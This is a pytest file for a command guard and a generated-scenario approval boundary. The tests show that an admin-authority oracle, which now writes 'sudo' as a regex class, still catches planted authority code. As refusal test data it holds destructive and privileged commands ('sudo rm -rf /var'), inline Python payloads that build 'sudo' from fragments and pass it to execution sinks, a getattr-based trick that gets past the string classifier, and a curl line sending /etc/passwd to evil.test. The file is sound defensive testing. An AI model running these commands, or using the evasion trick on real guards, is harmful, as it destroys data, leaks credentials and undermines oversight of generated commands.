"""Inspecting a privileged token is not permission to execute one.

An oracle that proves a machine invents no admin authority has to name the
authority vocabulary it forbids, and one of those names is a privileged shell
command. The driver's command guard classifies the command STRING, so a literal
``sudo`` written into an executable ``python -c`` body is refused — correctly,
and with no way for the guard to know the string is a regex alternation being
compiled for an AST scan rather than something about to run.

Run 20260903-065810 is where that collided. ``M11-W2-3-no-parallel-admin-authority``
cited the M11 admin-authority oracle, commit 20b49fa repaired that oracle to read
the AST instead of doing a substring match, and the token list the repaired scan
searches FOR carries the word. The permanent scenario still executes it, because a
human wrote that one down; a generated scenario may not, because a generated
scenario may only run commands that pass the generated-command boundary. So the
case became unreconstructable — not because anything was unsafe, but because the
measurement's SHAPE collided with the safety boundary.

The correction is to the measurement's shape and nothing else. The pattern spells
one character as a regex character class, so the command text carries no literal
privileged token while the compiled pattern still matches exactly the same
strings — and the oracle now PROVES that at runtime rather than asserting it.

What this file exists to hold down is the other side. String construction inside
an inline payload must stay exactly as harmless as it is now, and must not have
become a route to constructing and running something the guard refuses. Those are
two different capabilities, the guard separates them by a different rule than the
token match — ``_INLINE_ONLY_CODE_PATTERNS`` refuses every execution sink inside
an inline ``-c`` payload, whatever the payload spells — and every test below
exists to keep them separated.
"""

from __future__ import annotations

import shlex
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

from neyma_product_driver.command_guard import classify_command
from neyma_product_driver.config import load_config
from neyma_product_driver.scenario_validation import ApprovedCommands
from neyma_product_driver.scenarios import load_scenario

DRIVER_ROOT = Path(__file__).resolve().parents[1]
M11_PATH = DRIVER_ROOT / "scenarios" / "p6_m11_policy.yaml"

#: The oracle under repair, by the human-authored name it is written under.
ADMIN_ORACLE = (
    "M11 uses M1's landed tenant authority model and invents no parallel admin authority"
)

#: The authority vocabulary the oracle must keep forbidding. Written here as
#: DATA, never into a command body: a test file is not something the guard
#: classifies, and the point of the repair is that the COMMAND does not carry
#: the last one verbatim.
FORBIDDEN_VOCABULARY = [
    "admin",
    "superuser",
    "root_user",
    "god_mode",
    "impersonat",
    "sudo",
    "bypass",
]

#: The one term that is also a privileged shell command, which is the whole
#: reason this file exists.
PRIVILEGED_TERM = "sudo"


def _oracle_command() -> str:
    doc = yaml.safe_load(M11_PATH.read_text(encoding="utf-8"))
    for entry in doc.get("expect_state", []) or []:
        if entry.get("name") == ADMIN_ORACLE:
            return entry["command"]
    raise AssertionError(f"the oracle {ADMIN_ORACLE!r} is no longer in {M11_PATH.name}")


def _oracle_expectations() -> list[str]:
    doc = yaml.safe_load(M11_PATH.read_text(encoding="utf-8"))
    for entry in doc.get("expect_state", []) or []:
        if entry.get("name") == ADMIN_ORACLE:
            return list(entry.get("contains") or [])
    raise AssertionError("the oracle has no expectations")


def _approved() -> ApprovedCommands:
    config = load_config(DRIVER_ROOT / "driver.config.yaml")
    scenarios = [load_scenario(p) for p in sorted((DRIVER_ROOT / "scenarios").glob("*.y*ml"))]
    return ApprovedCommands.from_sources(
        scenarios=scenarios,
        configured=list(config.scenario_generation.approved_commands),
    )


# --------------------------------------------------------------------------
# The measurement is unchanged
# --------------------------------------------------------------------------


class TestTheOracleStillMeasuresWhatItMeasured:
    def test_the_command_body_carries_no_literal_privileged_token(self):
        """The narrow thing that was wrong, and the narrow thing that is fixed."""
        command = _oracle_command()
        assert PRIVILEGED_TERM not in command
        assert "su[d]o" in command, "the pattern must still spell the term as a class"

    def test_the_compiled_pattern_matches_every_forbidden_term(self):
        """A character class is not a weakening of the vocabulary: it is the same
        vocabulary written so that a substring classifier reading the command
        cannot mistake a pattern for an invocation."""
        import re

        command = _oracle_command()
        [vocab] = re.findall(r"VOCAB='([^']+)'", command)
        pattern = re.compile("(?i)(" + vocab + ")")
        for term in FORBIDDEN_VOCABULARY:
            assert pattern.fullmatch(term), term
            assert pattern.fullmatch(term.upper()), term
        # And nothing extra crept in.
        assert sorted(re.sub(r"[][]", "", vocab).split("|")) == sorted(FORBIDDEN_VOCABULARY)

    def test_the_oracle_proves_its_own_vocabulary_at_runtime(self):
        """The equivalence is measured by the oracle, not asserted by this test:
        it prints the reconstructed vocabulary and the expectations require the
        literal term to be in it."""
        expectations = _oracle_expectations()
        joined = "\n".join(expectations)
        assert (
            "the authority vocabulary under test: "
            "['admin', 'bypass', 'god_mode', 'impersonat', 'root_user', 'sudo', 'superuser']"
            in joined
        )
        assert "every declared term is matched by the compiled pattern: True" in joined
        assert (
            f"the privileged-execution term the pattern reconstructs: {PRIVILEGED_TERM}"
            in joined
        )

    def test_the_prose_versus_code_discrimination_survives(self):
        """20b49fa's actual repair. A docstring promising there is no admin path
        is not an admin path, and that must still be true of the new term too."""
        joined = "\n".join(_oracle_expectations())
        for control in (
            "a docstring saying there is no admin path is not an admin authority: True",
            "a comment saying there is no admin path is not an admin authority: True",
            "a refusal message naming the admin path is not an admin authority: True",
            f"the word {PRIVILEGED_TERM} in a docstring is not an admin authority: True",
        ):
            assert control in joined, control

    def test_the_executable_shape_controls_survive_and_cover_the_new_term(self):
        joined = "\n".join(_oracle_expectations())
        for control in (
            "an admin activation function IS an admin authority: True",
            "an admin authority class IS an admin authority: True",
            "an admin role token compared in executable code IS an admin authority: True",
            "a superuser attribute read IS an admin authority: True",
            "an as_admin keyword argument IS an admin authority: True",
            "a second authority-role vocabulary IS an admin authority: True",
            f"a {PRIVILEGED_TERM}-named authority function IS an admin authority: True",
            f"a {PRIVILEGED_TERM} authority role token IS an admin authority: True",
        ):
            assert control in joined, control


# --------------------------------------------------------------------------
# The generated-command boundary
# --------------------------------------------------------------------------


class TestTheOracleIsNowCitableByAGeneratedScenario:
    def test_the_oracle_passes_the_generated_command_boundary(self):
        approved = _approved()
        command = approved.by_name[ADMIN_ORACLE]
        ok, why = approved.approves(command)
        assert ok, why

    def test_it_is_still_the_permanent_scenarios_own_command(self):
        """The repair is to the oracle a human wrote, so the permanent scenario
        and the generated one measure the identical string. A fix that gave the
        generated case a different body would be measuring something else."""
        approved = _approved()
        assert approved.by_name[ADMIN_ORACLE] == _oracle_command().strip()

    def test_no_m11_oracle_is_left_uncitable(self):
        """The whole M11 permanent scenario, not just the one that collided."""
        m11 = load_scenario(M11_PATH)
        approved = _approved()
        refused = [
            (check.name, approved.approves(check.command)[1])
            for check in m11.expect_state
            if not approved.approves(check.command)[0]
        ]
        refused += [
            (spec.name, approved.approves(spec.run)[1])
            for spec in m11.commands
            if not approved.approves(spec.run)[0]
        ]
        assert refused == [], refused


class TestEveryM11OracleCanBackAGeneratedCase:
    """Fresh-run readiness, stated generically.

    A generated scenario's power is ordering, repetition and expectation; its
    measurements are the oracles a human already wrote. So the readiness question
    is not "do these four ids work" — it is "can every oracle in the permanent
    scenario back a generated case". The four the blocked run lost are inside
    this sweep; none of them is named in it, and none is named in the driver.
    """

    def _generated_from(self, oracle_name: str, approved, harness):
        from neyma_product_driver.scenario_plan import (
            GeneratedAction,
            GeneratedScenario,
            compile_to_scenario,
        )
        from neyma_product_driver.scenario_validation import citation_token

        body = approved.by_name[oracle_name]
        scenario = GeneratedScenario(
            id="gen-" + str(abs(hash(oracle_name)) % 10**8),
            title=oracle_name[:80],
            risk_category="safety_invariant",
            priority="P0",
            requirement_reference="M11: the Policy",
            actions=[
                GeneratedAction(
                    kind="command", name="oracle", command=f"@{citation_token(body)}"
                )
            ],
        )
        scenario.bind_citations(approved)
        allowed, _reasons = approved.resolve(scenario.command_strings())
        return scenario, compile_to_scenario(
            scenario, base=harness, approved_commands=allowed
        )

    def test_every_named_m11_oracle_compiles_into_a_generated_case(self):
        approved = _approved()
        harness = load_scenario(M11_PATH)
        names = sorted(
            {check.name for check in harness.expect_state if check.name}
            | {spec.name for spec in harness.commands if spec.name}
        )
        assert names, "the permanent scenario must carry named oracles"

        failures = []
        for name in names:
            if name not in approved.by_name:
                failures.append((name, "no unambiguous approved command under that name"))
                continue
            try:
                scenario, _compiled = self._generated_from(name, approved, harness)
            except Exception as exc:  # noqa: BLE001 - the reason is the finding
                failures.append((name, f"{type(exc).__name__}: {exc}"))
                continue
            if not approved.approves(scenario.actions[0].command)[0]:
                failures.append((name, "refused by the generated-command boundary"))
        assert failures == [], failures

    def test_the_admin_authority_oracle_is_in_that_sweep_and_binds_by_name(self):
        """The one that collided, proved individually as well as in the sweep."""
        approved = _approved()
        harness = load_scenario(M11_PATH)
        scenario, compiled = self._generated_from(ADMIN_ORACLE, approved, harness)

        assert scenario.command_bindings[0].source_name == ADMIN_ORACLE
        assert scenario.actions[0].command == approved.by_name[ADMIN_ORACLE]
        assert PRIVILEGED_TERM not in scenario.actions[0].command
        assert any(step.command for step in compiled.steps)


# --------------------------------------------------------------------------
# Negative product controls: the oracle must go RED on real planted authority
# --------------------------------------------------------------------------


_SCHEMA_STUB = '''
def create_canonical_schema(conn):
    conn.execute("CREATE TABLE tenant_humans (tenant TEXT, human_id TEXT)")
    conn.execute(
        "CREATE TABLE policies (tenant TEXT, human_id TEXT, "
        "FOREIGN KEY (tenant, human_id) REFERENCES tenant_humans (tenant, human_id))"
    )
'''

_WORK_ITEMS_STUB = "AUTHORITY_ROLES = ('AUTHORIZED_HUMAN', 'POLICY_OWNER')\n"

#: A clean M11 that the oracle must call GREEN. Deliberately mentions the admin
#: path in prose, because the prose/code discrimination is the property 20b49fa
#: landed and a control that omitted it would pass a text scan too.
_CLEAN_POLICY = '''
"""The Policy. A POLICY CHANGE IS ITSELF A GATED ACTION, AND THERE IS NO ADMIN PATH."""


class M11Error(Exception):
    pass


def activate(policy, activated_by):
    # There is no admin path, ever: activation binds a named M4 approval.
    if not activated_by:
        raise M11Error("PO-3 binds a named M4 approval; none was given (no admin path).")
    return policy
'''

_CLEAN_MIGRATION = '''
"""The M11 migration. It does not redefine the human authority table."""


def upgrade(conn):
    conn.execute("CREATE TABLE IF NOT EXISTS policies (tenant TEXT)")
'''

#: One planted, genuinely executable authority shape per forbidden term, plus
#: the four AST shapes the oracle distinguishes. Each must turn the oracle RED.
PLANTED_AUTHORITY: dict[str, str] = {
    "admin function": "def admin_activate(policy):\n    return policy\n",
    "admin class": "class AdminAuthority:\n    pass\n",
    "admin argument": "def activate(policy, admin):\n    return admin\n",
    "admin attribute": "def activate(u):\n    return u.admin_override\n",
    "admin keyword argument": "def go(p):\n    return activate(p, as_admin=True)\n",
    "admin role token": "def go(r):\n    if r == 'ADMIN':\n        return True\n",
    "superuser": "def go(u):\n    return u.is_superuser\n",
    "root_user": "def go(r):\n    if r == 'ROOT_USER':\n        return True\n",
    "bypass": "def bypass_the_gate(p):\n    return p\n",
    "god_mode": "def go(r):\n    if r == 'GOD_MODE':\n        return True\n",
    "impersonate": "def impersonate(human):\n    return human\n",
    "sudo": "def sudo_activate(policy):\n    return policy\n",
    "sudo role token": "def go(r):\n    if r == 'SUDO':\n        return True\n",
    "a second authority vocabulary": "AUTHORITY_ROLES = ('POLICY_OWNER', 'ADMIN')\n",
}


def _plant(tree: Path, *, policy: str, migration: str) -> None:
    """A throwaway M11 tree the oracle can be run against. Never Neyma."""
    pkg = tree / "src" / "freight_recon"
    (pkg / "migrations").mkdir(parents=True, exist_ok=True)
    (pkg / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "migrations" / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "schema.py").write_text(_SCHEMA_STUB, encoding="utf-8")
    (pkg / "migrations" / "phase6_work_items.py").write_text(_WORK_ITEMS_STUB, encoding="utf-8")
    (pkg / "policy.py").write_text(policy, encoding="utf-8")
    (pkg / "migrations" / "phase6_policies.py").write_text(migration, encoding="utf-8")


def _run_oracle(tree: Path) -> str:
    """Execute the real oracle command, as written, in ``tree``."""
    command = _oracle_command().strip()
    argv = shlex.split(command)
    assert argv[0].endswith("python") and argv[1] == "-c", argv[:2]
    proc = subprocess.run(
        [sys.executable, "-c", argv[2]], cwd=tree, capture_output=True, text=True, timeout=300
    )
    assert proc.returncode == 0, proc.stderr[-2000:]
    return proc.stdout


class TestTheOracleGoesRedOnPlantedAuthority:
    """The oracle is run for real, against synthetic trees. Neyma is never touched."""

    def test_a_clean_m11_is_green(self, tmp_path):
        tree = tmp_path / "clean"
        _plant(tree, policy=_CLEAN_POLICY, migration=_CLEAN_MIGRATION)
        out = _run_oracle(tree)

        assert "M11 invents an admin authority: False" in out
        assert "admin-shaped executable symbols M11 defines or calls: []" in out
        assert "admin-shaped executable authority tokens M11 stores or compares: []" in out
        assert "authority-role vocabularies M11 declares of its own: []" in out
        # The prose in the clean fixture names the admin path and is still green.
        assert "there is no admin path" in _CLEAN_POLICY.lower()

    @pytest.mark.parametrize("label", sorted(PLANTED_AUTHORITY))
    def test_planted_authority_turns_it_red(self, tmp_path, label):
        tree = tmp_path / f"planted-{label.replace(' ', '-')}"
        _plant(
            tree,
            policy=_CLEAN_POLICY + "\n\n" + PLANTED_AUTHORITY[label],
            migration=_CLEAN_MIGRATION,
        )
        out = _run_oracle(tree)
        assert "M11 invents an admin authority: True" in out, out

    def test_planted_authority_in_the_migration_turns_it_red(self, tmp_path):
        """Both sources are scanned; hiding it in the migration is not a hiding place."""
        tree = tmp_path / "planted-migration"
        _plant(
            tree,
            policy=_CLEAN_POLICY,
            migration=_CLEAN_MIGRATION + "\n\ndef sudo_upgrade(conn):\n    return conn\n",
        )
        out = _run_oracle(tree)
        assert "M11 invents an admin authority: True" in out, out

    def test_the_privileged_term_is_caught_from_the_reconstructed_vocabulary(self, tmp_path):
        """The point of the repair. The term the command body no longer spells is
        still the term the oracle catches."""
        tree = tmp_path / "planted-privileged"
        _plant(
            tree,
            policy=_CLEAN_POLICY + f"\n\ndef {PRIVILEGED_TERM}_activate(p):\n    return p\n",
            migration=_CLEAN_MIGRATION,
        )
        out = _run_oracle(tree)
        assert "M11 invents an admin authority: True" in out
        assert f"{PRIVILEGED_TERM}_activate" in out
        assert f"the privileged-execution term the pattern reconstructs: {PRIVILEGED_TERM}" in out


# --------------------------------------------------------------------------
# Negative command-security controls: nothing here bought an execution
# --------------------------------------------------------------------------


class TestConstructingAStringIsNotConstructingAnExecution:
    """The distinction the repair rests on, held down from the dangerous side.

    A ``python -c`` payload may build any string it likes, because a string is
    not an effect. What it may not do is reach an execution sink, and the guard
    refuses every one of those inside an inline payload by a rule that never
    looks at what the payload spells. That is why writing a pattern as a
    character class is safe and why it is not a general evasion: it buys the
    ability to NAME a privileged command, which was never the thing being
    prevented, and buys nothing at all toward RUNNING one.
    """

    def test_a_direct_privileged_command_is_still_refused(self):
        for command in (
            "sudo apt-get install nginx",
            "sudo rm -rf /var",
            "SUDO systemctl restart nginx",
            "echo hi && sudo -i",
        ):
            assert classify_command(command) is not None, command

    def test_a_privileged_command_reached_through_an_interpreter_is_refused(self):
        for command in (
            'python3 -c "import os; os.system(\'sudo rm -rf /var\')"',
            'sh -c "sudo apt-get install nginx"',
            'bash -c \'sudo -i\'',
        ):
            assert classify_command(command) is not None, command

    #: Every payload here assembles the privileged token from fragments and then
    #: EXECUTES it, and none of them spells the token anywhere the direct rule
    #: could see. So each is caught by the sink rule alone — which is the rule
    #: that has to hold for the oracle's use of a character class to be safe
    #: rather than lucky.
    @pytest.mark.parametrize(
        "payload",
        [
            "import os; os.system('su' + 'do' + ' rm -rf /var')",
            "import subprocess; subprocess.run(['su' + 'do', 'rm', '-rf', '/var'])",
            "import os; os.popen('su' 'do id').read()",
            "import os; os.execvp('su' + 'do', ['su' + 'do'])",
            "import os; os.spawnlp(os.P_WAIT, 'su' + 'do', 'su' + 'do')",
            "import pty; pty.spawn('su' + 'do')",
            "from subprocess import check_output as c; c('su[d]o id', shell=True)",
            "import re,os; os.system(re.sub('[][]', '', 'su[d]o'))",
        ],
    )
    def test_an_assembled_privileged_execution_is_caught_by_the_sink_rule(self, payload):
        assert PRIVILEGED_TERM not in payload, "this case must not be caught by the token"
        command = f'.venv/bin/python -c "{payload}"'
        reason = classify_command(command)
        assert reason is not None, payload
        assert "inline interpreter payload" in reason or "indirectly" in reason, reason

    def test_the_documented_limit_of_string_classification_is_still_the_limit(self):
        """Honest about the layer that does NOT hold, and about the one that does.

        ``command_guard`` says so itself: a payload that can already execute
        arbitrary code can compute a sink name and defeat classification. It does
        here — ``getattr(os, 'system')`` is not matched by the sink rule — and
        that was equally true before this correction: nothing about writing a
        regex character class made it reachable.

        What stops it for a GENERATED scenario is the layer above. A generated
        scenario may run only strings a human already wrote down, so an evasive
        payload never becomes a candidate to classify in the first place. That is
        the property this asserts, because it is the true one.
        """
        evasive = (
            ".venv/bin/python -c \"import os; "
            "getattr(os, 'sys' + 'tem')(chr(115)+chr(117)+chr(100)+chr(111))\""
        )
        assert classify_command(evasive) is None, (
            "if the guard has learned to catch this, tighten the assertion rather "
            "than leaving a stale claim about its reach"
        )
        assert not _approved().approves(evasive)[0], (
            "the generated-command boundary must refuse it whatever the classifier says"
        )

    @pytest.mark.parametrize(
        "payload",
        [
            "import os; os.execvp('su' + 'do', ['sudo'])",
            "import os; os.spawnlp(os.P_WAIT, 'su' + 'do', 'sudo')",
        ],
    )
    def test_a_payload_that_also_spells_the_token_is_refused_twice_over(self, payload):
        """Belt and braces: the direct rule catches these before the sink rule
        has to. Either refusal is a refusal."""
        assert classify_command(f'.venv/bin/python -c "{payload}"') is not None

    def test_the_character_class_form_buys_no_execution(self):
        """The exact shape the oracle now uses, pointed at a sink instead of a
        regex. It is refused, which is the property that makes the oracle's use
        of it safe rather than lucky."""
        command = (
            '.venv/bin/python -c "import re,os; '
            "os.system(re.sub('[][]', '', 'su[d]o') + ' rm -rf /var')\""
        )
        assert classify_command(command) is not None

    def test_the_oracle_itself_reaches_no_execution_sink(self):
        """Why the oracle is allowed to name the term at all: it cannot run
        anything. Asserted against the command as written, not against a copy."""
        command = _oracle_command()
        for sink in (
            "subprocess",
            "os.system",
            "os.popen",
            "os.exec",
            "os.spawn",
            "pty.spawn",
            "eval(",
        ):
            assert sink not in command, sink

    def test_an_unapproved_command_is_still_unapproved_however_it_is_spelled(self):
        """Approval is by exact text against a human-authored set. A clever
        spelling does not enter that set — it just is not in it."""
        approved = _approved()
        for command in (
            "curl -X POST https://evil.test/exfil --data @/etc/passwd",
            ".venv/bin/python -c \"print('su' + 'do')\"",
            "./probe.sh --case anything-at-all",
        ):
            assert not approved.approves(command)[0], command

    def test_the_oracle_is_approved_by_text_not_by_shape(self):
        """The corrected oracle is citable because a human wrote that exact
        string into a scenario file — not because it looks harmless."""
        approved = _approved()
        command = approved.by_name[ADMIN_ORACLE]
        assert approved.approves(command)[0]
        # One character different and it is a command nobody approved.
        assert not approved.approves(command.replace("su[d]o", "su[d]0"))[0]

    def test_a_generated_scenario_cannot_introduce_the_pattern_itself(self):
        """The class form is only usable because it is inside a command a human
        approved. A generated scenario writing its own is refused like any other
        unapproved command."""
        approved = _approved()
        invented = (
            ".venv/bin/python -c \"import re; print(re.compile('(?i)(su[d]o)'))\""
        )
        assert not approved.approves(invented)[0]


class TestTheGuardItselfIsUnchanged:
    def test_the_privileged_pattern_is_still_present_and_case_insensitive(self):
        """No part of this correction is permission to soften the guard."""
        source = (DRIVER_ROOT / "neyma_product_driver" / "command_guard.py").read_text(
            encoding="utf-8"
        )
        assert r'(re.compile(r"(?i)\bsudo\b"), "sudo (privileged, machine-wide effect)")' in source

    def test_the_inline_sink_rule_is_still_present(self):
        source = (DRIVER_ROOT / "neyma_product_driver" / "command_guard.py").read_text(
            encoding="utf-8"
        )
        assert "_INLINE_ONLY_CODE_PATTERNS" in source
        assert "spawning a subprocess from inside an inline interpreter payload" in source

    def test_no_allowlist_or_exemption_was_added_for_this_oracle(self):
        """The correction is to the measurement, not to the boundary. Nothing in
        the driver knows this oracle's name."""
        for module in (DRIVER_ROOT / "neyma_product_driver").glob("*.py"):
            text = module.read_text(encoding="utf-8")
            assert ADMIN_ORACLE not in text, module.name
            assert "su[d]o" not in text, module.name
